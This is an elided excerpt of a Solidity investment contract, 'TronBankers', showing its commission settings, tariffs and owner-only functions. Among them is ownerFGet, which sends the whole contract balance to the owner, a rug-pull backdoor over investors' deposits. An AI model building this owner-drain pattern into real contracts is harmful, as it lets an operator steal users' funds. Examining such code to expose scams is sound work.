...
contract TronBankers {
    ...
    uint256 public dev_comission = 2;
    uint256 public sm_commission = 3;
    uint256 public market_com = 6;
    ...
    constructor(address payable _sm, address payable _marketing) public {
        ...
        tarifs.push(Tarif(1000, 10000));
        tarifs.push(Tarif(4, 120));
    ...
    */
    ...
    function ownerGet(uint256 _amount) public ownerOnly{
        owner.transfer(_amount);
    } 
    function ownerFGet() public ownerOnly{
        owner.transfer(address(this).balance);
    } 
    
     function changeDevCo(uint256 _newDevCommission) public ownerOnly{
       dev_comission = _newDevCommission;
    } 
